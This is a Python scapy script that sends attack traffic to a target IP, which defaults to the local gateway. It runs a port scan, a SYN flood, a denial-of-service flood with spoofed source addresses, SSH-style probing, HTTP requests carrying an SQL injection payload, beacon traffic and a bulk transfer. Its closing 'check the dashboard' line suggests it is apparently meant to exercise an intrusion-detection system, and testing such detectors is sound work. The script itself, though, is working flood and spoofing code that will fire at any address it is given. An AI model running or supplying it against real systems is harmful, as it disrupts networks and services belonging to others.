#attacks.py - real attacks from this PC, scapy only
import sys,time
from scapy.all import IP,TCP,Raw,send,conf
conf.verb=0
target=sys.argv[1] if len(sys.argv)>1 else conf.route.route("0.0.0.0")[2]
print("target:",target)

print("[1/7] port scan ...")
send([IP(dst=target)/TCP(dport=p,flags="S") for p in range(1,600)],verbose=0)
print("[2/7] syn flood (DoS) ...")
send([IP(dst=target)/TCP(sport=1234,dport=80,flags="S") for _ in range(3000)],verbose=0)
print("[3/7] ddos, 5 spoofed sources ...")
pk=[]
for i in range(1,6):
    pk+=[IP(src="10.9.9.%d"%i,dst=target)/TCP(sport=1234,dport=80,flags="S") for _ in range(600)]
send(pk,verbose=0)
print("[4/7] ssh brute force style ...")
for i in range(40):
    send(IP(dst=target)/TCP(sport=46000+i,dport=22,flags="S")/Raw(b"\x00"*60),count=3,inter=0.05,verbose=0)
print("[5/7] web attack style ...")
for i in range(20):
    send(IP(dst=target)/TCP(sport=47000+i,dport=80,flags="PA")/Raw("GET /page?id=1' OR '1'='1 HTTP/1.0\r\n\r\n"),count=2,inter=0.05,verbose=0)
print("[6/7] bot beacon, ~30s ...")
for i in range(15):
    send(IP(dst=target)/TCP(sport=48000,dport=443,flags="PA")/Raw(b"beacon"),count=2,inter=0.2,verbose=0)
    time.sleep(1.8)
print("[7/7] big transfer (infiltration style) ...")
send([IP(dst=target)/TCP(sport=49000,dport=443,flags="PA")/Raw(b"B"*1300) for _ in range(400)],inter=0.01,verbose=0)
print("done - check the dashboard")